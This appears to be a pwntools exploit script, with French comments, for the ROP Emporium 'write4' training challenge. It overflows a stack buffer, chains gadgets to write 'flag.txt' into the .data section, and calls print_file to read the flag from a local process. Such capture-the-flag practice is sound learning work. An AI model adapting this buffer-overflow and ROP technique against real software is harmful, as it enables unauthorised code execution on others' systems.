#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

# break apres le read dans pwnme
gs='''
b *pwnme+150
c
'''

# Offset avant ecrasement de l'adresse de retour
offset=0x28

# Set up pwntools for the correct architecture
elf =  ELF('write4')
context.binary=elf

print_file=elf.plt['print_file']

data = 0x0601028
# pop r14 ; pop r15 ; ret
pop_r1415=0x400690
# mov qword ptr [r14], r15 ; ret
write_r14=0x400628
# pop rdi ; ret
pop_rdi = 0x400693

# Build a ROP chaine to write a message in a given address
# Dont add a final zero 
def w_write(addr, data):
    r=b""
    if type(data) == str:
        data=data.encode()
    for i in range(0,len(data),8):
        r += p64(pop_r1415)
        r += p64(addr)
        r += data[i:i+8]
        r += p64(write_r14)
    return r

log.info("start")
PL =b"A"*offset
PL+=w_write(data,"flag.txt")
PL+=p64(pop_rdi)
PL+=p64(data)
PL+=p64(print_file)

io = process([elf.path])

if len(sys.argv)>1 and sys.argv[1] == "-d":
    gdb.attach(io,gs)
    time.sleep(1)

io.sendline(PL)
io.interactive()

